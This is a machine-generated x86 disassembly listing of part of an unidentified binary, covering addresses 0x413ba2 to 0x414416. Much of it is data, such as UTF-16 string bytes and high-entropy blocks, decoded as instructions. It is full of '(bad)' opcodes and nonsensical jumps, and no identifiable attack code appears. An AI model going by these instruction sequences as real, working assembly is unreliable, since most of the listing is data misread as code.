  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	fnsave [edi+0x36]
  413baa:	inc    ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	hlt    
  413bf5:	add    BYTE PTR [ebx+0x0],al
  413bf8:	pop    ecx
  413bf9:	dec    ecx
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    BYTE PTR [edx+0x11],ch
  413c46:	inc    ebx
  413c47:	add    BYTE PTR [eax],al
  413c49:	add    BYTE PTR [eax],al
  413c4b:	add    BYTE PTR [eax+eax*1+0x46],al
  413c4f:	add    BYTE PTR [ecx+0x0],ch
  413c52:	outs   dx,DWORD PTR ds:[esi]
  413c53:	add    BYTE PTR [edx+0x0],cl
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	cmp    ecx,ebx
  413f02:	xchg   edx,eax
  413f03:	sbb    al,0xdc
  413f05:	rol    DWORD PTR [eax],1
  413f07:	add    BYTE PTR [ecx+eax*1],al
  413f0a:	add    BYTE PTR [eax],al
  413f0c:	inc    ebx
  413f0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f0e:	xchg   edi,eax
  413f0f:	xchg   ecx,eax
  413f10:	or     ebp,DWORD PTR [ecx-0x1d10781b]
  413f16:	arpl   WORD PTR [ebx],di
  413f18:	add    BYTE PTR [esi-0x4e0de478],dh
  413f1e:	adc    bl,BYTE PTR [eax+ebp*8+0x6e]
  413f22:	jbe    0x413efb
  413f24:	outs   dx,DWORD PTR ds:[esi]
  413f25:	xor    eax,0x6f1f2700
  413f2a:	daa    
  413f2b:	lods   al,BYTE PTR ds:[esi]
  413f2c:	cmp    eax,0xa933a80b
  413f31:	fidivr WORD PTR [ecx+0x5ea50e44]
  413f37:	mov    edi,DWORD PTR [edx-0x55]
  413f3a:	pop    ss
  413f3b:	aad    0x96
  413f3d:	add    al,0xb7
  413f3f:	dec    edx
  413f40:	cmp    eax,DWORD PTR [edi+0x1e688cee]
  413f46:	pop    es
  413f47:	mov    al,ds:0x2d28ecc9
  413f4c:	jns    0x413f60
  413f4e:	adc    al,bh
  413f50:	retf   
  413f51:	stc    
  413f52:	dec    eax
  413f53:	fnsave [ebp+eax*8-0x57]
  413f57:	mov    esp,0x23f25b7d
  413f5c:	xor    dl,BYTE PTR [ebx-0x20739670]
  413f62:	clc    
  413f63:	sub    bh,BYTE PTR [esi-0x31385d14]
  413f69:	xchg   al,bh
  413f6b:	outs   dx,DWORD PTR ds:[esi]
  413f6c:	(bad)  
  413f6d:	xchg   ecx,eax
  413f6e:	and    eax,0xb23f868d
  413f73:	nop
  413f74:	mov    dh,0xf
  413f76:	sbb    al,0x65
  413f78:	push   edi
  413f79:	add    al,0xa1
  413f7b:	aam    0xc
  413f7d:	cdq    
  413f7e:	push   edx
  413f7f:	cmp    DWORD PTR [ecx+0x41],edi
  413f82:	rol    ebx,cl
  413f84:	push   edi
  413f85:	mov    edi,0x41a977dc
  413f8a:	call   0xa8c06b20
  413f8f:	das    
  413f90:	pusha  
  413f91:	imul   ecx,ecx,0xffffffac
  413f94:	leave  
  413f95:	or     edi,DWORD PTR [edi]
  413f97:	xor    dh,dh
  413f99:	fcmovnu st,st(3)
  413f9b:	inc    ecx
  413f9c:	fwait
  413f9d:	arpl   WORD PTR [edx],dx
  413f9f:	outs   dx,DWORD PTR ds:[esi]
  413fa0:	xor    bh,BYTE PTR ds:0xc1e73050
  413fa6:	cs ins DWORD PTR es:[edi],dx
  413fa8:	imul   BYTE PTR [edi-0x68aec75d]
  413fae:	or     al,0x42
  413fb0:	cmp    BYTE PTR [edi-0x48],al
  413fb3:	test   ax,0x445
  413fb7:	cmp    BYTE PTR [edi-0x13b168c4],dh
  413fbd:	pusha  
  413fbe:	or     dh,BYTE PTR [edx]
  413fc0:	mul    DWORD PTR [esi+0x16]
  413fc3:	pop    es
  413fc4:	cs pop esp
  413fc6:	mov    BYTE PTR [ebx+0x29],bh
  413fc9:	nop
  413fca:	into   
  413fcb:	ds fsub QWORD PTR cs:[ebx]
  413fcf:	adc    al,0x6
  413fd1:	mov    ch,0xd6
  413fd3:	inc    eax
  413fd4:	sbb    DWORD PTR [ebx+eiz*4+0x1d],edi
  413fd8:	aaa    
  413fd9:	xor    ebx,DWORD PTR [esi+0x29]
  413fdc:	jge    0x414043
  413fde:	and    eax,0xc44779b1
  413fe3:	pop    ecx
  413fe4:	int    0x2d
  413fe6:	inc    eax
  413fe7:	xchg   DWORD PTR [eax],edi
  413fe9:	lods   eax,DWORD PTR ds:[esi]
  413fea:	cmp    ebp,DWORD PTR [ebx+0x6934f9a6]
  413ff0:	out    dx,al
  413ff1:	popf   
  413ff2:	icebp  
  413ff3:	push   esp
  413ff4:	push   0xec5fd475
  413ff9:	or     BYTE PTR ds:0x6eb69377,dh
  413fff:	fbld   TBYTE PTR [ecx]
  414001:	ficom  DWORD PTR ds:0xfc15c099
  414007:	xchg   BYTE PTR [edi-0x65058c58],bl
  41400d:	mov    ah,0x43
  41400f:	fld    DWORD PTR [eax]
	...
  414071:	add    BYTE PTR [eax],al
  414073:	add    BYTE PTR [edx-0x26],bl
  414076:	push   esi
  414077:	pusha  
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x6b9a:0x5cd52e96
  414083:	xor    ah,al
  414085:	rol    BYTE PTR [eax],cl
  414087:	add    BYTE PTR [ecx+eax*1],al
  41408a:	add    BYTE PTR [eax],al
  41408c:	xor    eax,DWORD PTR [edi+ecx*1+0x61]
  414090:	stos   BYTE PTR es:[edi],al
  414091:	call   0x2378:0xd17ed79b
  414098:	pop    es
  414099:	push   cs
  41409a:	sbb    BYTE PTR [ecx],ch
  41409c:	mov    ch,bl
  41409e:	addr16 retf 
  4140a0:	add    al,dl
  4140a2:	jae    0x4140ee
  4140a4:	sti    
  4140a5:	pop    ebx
  4140a6:	adc    BYTE PTR [ebp+0x37a64ea5],0xb9
  4140ad:	out    0x60,al
  4140af:	dec    esp
  4140b0:	aaa    
  4140b1:	fs repz adc eax,0x15eb53b2
  4140b8:	cmp    bh,al
  4140ba:	push   es
  4140bb:	ret    0xdc46
  4140be:	and    edx,DWORD PTR [ebp-0x24eeea36]
  4140c4:	hlt    
  4140c5:	mov    ds:0xce13c469,al
  4140ca:	shr    BYTE PTR [edi],1
  4140cc:	inc    eax
  4140cd:	les    ecx,FWORD PTR [edx]
  4140cf:	xchg   edx,eax
  4140d0:	jbe    0x41405b
  4140d2:	test   cl,dl
  4140d4:	pop    ss
  4140d5:	inc    ecx
  4140d6:	jge    0x4140ed
  4140d8:	or     BYTE PTR [esp+edi*8+0x49],al
  4140dc:	sti    
  4140dd:	inc    ebp
  4140de:	mov    gs,WORD PTR [ebp+0x6b]
  4140e1:	fidivr DWORD PTR [eax-0x49]
  4140e4:	bound  esi,QWORD PTR [ebp-0x7a]
  4140e7:	sar    BYTE PTR [eax],1
  4140e9:	sub    BYTE PTR [edi-0x6f12e79a],al
  4140ef:	cmp    edx,DWORD PTR [edx-0x44500b67]
  4140f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140f6:	lods   al,BYTE PTR ds:[esi]
  4140f7:	dec    ebx
  4140f8:	stos   BYTE PTR es:[edi],al
  4140f9:	mov    eax,0xe8d57b01
  4140fe:	in     eax,dx
  4140ff:	icebp  
  414100:	mov    ds:0xb26445ad,al
  414105:	stc    
  414106:	and    al,0x5c
  414108:	push   0x606c5d9d
  41410d:	out    0x8c,eax
  41410f:	dec    eax
  414110:	(bad)  
  414111:	push   edi
  414112:	jle    0x41411f
  414114:	jg     0x41417f
  414116:	ds imul edi,eax,0x641d0d7c
  41411d:	fnsave [edi+eiz*2]
  414120:	cmp    ebp,DWORD PTR ds:0x23557904
  414126:	idiv   DWORD PTR [esi+ebx*1+0x1a12e15b]
  41412d:	jmp    0x4cc7:0xc1ed71fd
  414134:	fcom   QWORD PTR [ecx]
  414136:	(bad)  
  414137:	rcr    BYTE PTR [edi-0x1818f410],cl
  41413d:	sub    ecx,DWORD PTR [esi]
  41413f:	in     al,dx
  414140:	mov    DWORD PTR [edx],esp
  414142:	out    dx,eax
  414143:	dec    edi
  414144:	cwde   
  414145:	loopne 0x414132
  414147:	bnd jl 0x414145
  41414a:	inc    esi
  41414b:	popf   
  41414c:	fldcw  WORD PTR [edi]
  41414e:	xchg   esi,eax
  41414f:	test   cl,0x89
  414152:	add    ch,BYTE PTR [ebx]
  414154:	into   
  414155:	repnz fadd DWORD PTR [edx+0x1d]
  414159:	add    cl,bl
  41415b:	sub    ah,dh
  41415d:	int    0xf9
  41415f:	or     eax,0x4f809bab
  414164:	pop    ecx
  414165:	(bad)  
  414167:	jne    0x414195
  414169:	aaa    
  41416a:	js     0x4140ed
  41416c:	ret    0x8653
  41416f:	sbb    al,0x8
  414171:	or     bl,BYTE PTR [edx+0x36340a1f]
  414177:	repnz (bad) 
  414179:	push   esp
  41417a:	mov    ah,0x13
  41417c:	test   eax,0x73318f4e
  414181:	(bad)  
  414182:	jecxz  0x4141eb
  414184:	adc    al,0x84
  414186:	fld    QWORD PTR [edi+0x2047729c]
  41418c:	fwait
  41418d:	jmp    0x0:0x3e0e
	...
  4141f4:	add    dl,BYTE PTR [edx]
  4141f6:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	test   al,0x40
  414202:	out    dx,eax
  414203:	stos   DWORD PTR es:[edi],eax
  414204:	in     al,0xd3
  414206:	add    BYTE PTR [eax],al
  414208:	add    al,0x1
  41420a:	add    BYTE PTR [eax],al
  41420c:	xchg   ecx,eax
  41420d:	test   al,0xd
  41420f:	cmp    eax,DWORD PTR [ecx]
  414211:	sub    al,0xd5
  414213:	cld    
  414214:	push   ss
  414215:	jno    0x414259
  414217:	int    0xb0
  414219:	cmp    eax,0x31a2b7ec
  41421e:	mov    dl,0xaf
  414220:	xor    di,0x1e19
  414225:	mov    esi,0xb448f941
  41422a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41422b:	outs   dx,DWORD PTR ds:[esi]
  41422c:	and    esp,DWORD PTR [ebx]
  41422e:	je     0x414283
  414230:	adc    edi,esi
  414232:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414233:	(bad)  
  414234:	arpl   WORD PTR ds:0x36c2948a,ax
  41423a:	gs js  0x4141e3
  41423d:	imul   ah
  41423f:	sub    eax,0x3a7f439c
  414244:	in     al,dx
  414245:	loope  0x41426f
  414247:	sub    ch,BYTE PTR [eax]
  414249:	data16 mov dh,0xe4
  41424c:	scas   eax,DWORD PTR es:[edi]
  41424d:	or     eax,0xe44b7681
  414252:	ret    
  414253:	push   esp
  414254:	in     al,0xdd
  414256:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414257:	push   edi
  414258:	nop
  414259:	mov    al,ds:0x6b7d3e20
  41425e:	add    bh,bh
  414260:	out    0x48,al
  414262:	out    0x8c,eax
  414264:	loopne 0x4142b9
  414266:	mov    ch,0xf5
  414268:	cmc    
  414269:	push   ebp
  41426a:	js     0x414286
  41426c:	and    ah,dh
  41426e:	pusha  
  41426f:	aam    0x2d
  414271:	mov    al,ds:0xf65eaa3f
  414276:	ss out 0x8,al
  414279:	dec    edx
  41427a:	inc    edx
  41427b:	iret   
  41427c:	mov    bh,0x5e
  41427e:	lods   eax,DWORD PTR ds:[esi]
  41427f:	inc    eax
  414280:	fsubr  DWORD PTR [ebx]
  414282:	and    eax,0x9aa46ce6
  414287:	(bad)  
  414288:	xor    al,0x6b
  41428a:	adc    ebp,DWORD PTR [ebx+eax*8]
  41428d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41428e:	ja     0x414292
  414290:	inc    ebx
  414291:	bound  edx,QWORD PTR [ebx+eiz*4+0x76]
  414295:	push   0x0
  414297:	cs xchg ebx,eax
  414299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41429a:	sbb    DWORD PTR [eax+0x7c],ebx
  41429d:	mov    ebp,DWORD PTR [esi+esi*4-0x72]
  4142a1:	jae    0x4142b5
  4142a3:	adc    edx,DWORD PTR [ebp-0x2a]
  4142a6:	jnp    0x414307
  4142a8:	stos   DWORD PTR es:[edi],eax
  4142a9:	test   ax,0xe4a4
  4142ad:	loope  0x414324
  4142af:	fsub   DWORD PTR [ebp-0x2d69cc71]
  4142b5:	inc    edx
  4142b6:	cmp    ecx,edx
  4142b8:	rcr    eax,0x61
  4142bb:	(bad)  
  4142bc:	cdq    
  4142bd:	dec    esi
  4142be:	mov    dl,0x1a
  4142c0:	test   al,0x40
  4142c2:	stos   BYTE PTR es:[edi],al
  4142c3:	sbb    eax,0x4b6e48bb
  4142c8:	and    dl,bl
  4142ca:	jg     0x4142b2
  4142cc:	xchg   esi,eax
  4142cd:	or     eax,0xe3dccb8f
  4142d2:	inc    ebx
  4142d3:	or     DWORD PTR [eax-0x22],edi
  4142d6:	jp     0x41427b
  4142d8:	shl    BYTE PTR [ecx],0xd
  4142db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142dc:	mov    ah,BYTE PTR [ebx]
  4142de:	jb     0x41434b
  4142e0:	jecxz  0x4142be
  4142e2:	and    eax,0x268a9954
  4142e7:	add    ebx,DWORD PTR [eax]
  4142e9:	mov    al,0x5
  4142eb:	push   0xe34a0248
  4142f0:	(bad)  
  4142f1:	fdivp  st(2),st
  4142f3:	ins    BYTE PTR es:[edi],dx
  4142f4:	mov    edi,0x4f970131
  4142f9:	imul   esp,DWORD PTR [eax-0x16],0x6f2ad0c5
  414300:	push   ebx
  414301:	(bad)  
  414302:	aas    
  414303:	jmp    0x414377
  414305:	nop
  414306:	or     DWORD PTR [eax+0x35bb81d6],ebx
  41430c:	sahf   
  41430d:	sub    al,0x2c
  41430f:	or     BYTE PTR [eax],al
	...
  414371:	add    BYTE PTR [eax],al
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	sbb    eax,0xe8096676
  414385:	aam    0x0
  414387:	add    BYTE PTR [ecx+eax*1],al
  41438a:	add    BYTE PTR [eax],al
  41438c:	lods   al,BYTE PTR ds:[esi]
  41438d:	cld    
  41438e:	popf   
  41438f:	(bad)  
  414390:	xchg   esi,eax
  414391:	mov    ecx,DWORD PTR [edx]
  414393:	push   ebp
  414394:	jmpw   0x731b
  414398:	fild   DWORD PTR [esp+eax*2+0xdddd26b]
  41439f:	mov    eax,ds:0x41513ee3
  4143a4:	or     cl,BYTE PTR [edi]
  4143a6:	add    ebp,ebx
  4143a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4143a9:	xor    DWORD PTR [edi],ebx
  4143ab:	xor    al,0x20
  4143ad:	add    DWORD PTR [edi-0x2cb92fa3],0xf
  4143b4:	push   ebp
  4143b5:	retf   0x5ded
  4143b8:	inc    eax
  4143b9:	ins    DWORD PTR es:[edi],dx
  4143ba:	fmul   DWORD PTR cs:[ecx]
  4143bd:	ds gs dec ebx
  4143c0:	or     BYTE PTR [si+0x18],0x3
  4143c5:	hlt    
  4143c6:	ficomp DWORD PTR [ebx+0x73a78b40]
  4143cc:	sbb    edi,DWORD PTR [esi+0x65bf7e5b]
  4143d2:	xor    esp,DWORD PTR [esi]
  4143d4:	add    DWORD PTR [ebp+0x22],ebp
  4143d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143d8:	das    
  4143d9:	sahf   
  4143da:	mov    cl,0xf2
  4143dc:	add    ebp,DWORD PTR [esp+esi*8-0x4fcb579]
  4143e3:	sub    al,0x2
  4143e5:	lods   eax,DWORD PTR ds:[esi]
  4143e6:	leave  
  4143e7:	jecxz  0x41439a
  4143e9:	cs scas eax,DWORD PTR es:[edi]
  4143eb:	mul    BYTE PTR [ebx-0x67586d00]
  4143f1:	das    
  4143f2:	leave  
  4143f3:	es inc eax
  4143f5:	cmp    dh,al
  4143f7:	or     eax,0x54db01e9
  4143fc:	sub    BYTE PTR [ebx+0x7f],bl
  4143ff:	fwait
  414400:	mov    esi,0x8f6bf5cf
  414405:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414406:	jmp    0x88750d16
  41440b:	xor    esp,0xffffffea
  41440e:	adc    dl,BYTE PTR [edx]
  414410:	out    dx,eax
  414411:	test   al,0x87
  414413:	xchg   ebp,eax
  414414:	xor    bh,BYTE PTR [edx]
  414416:	fcom   DWORD PTR [edx-0x17]
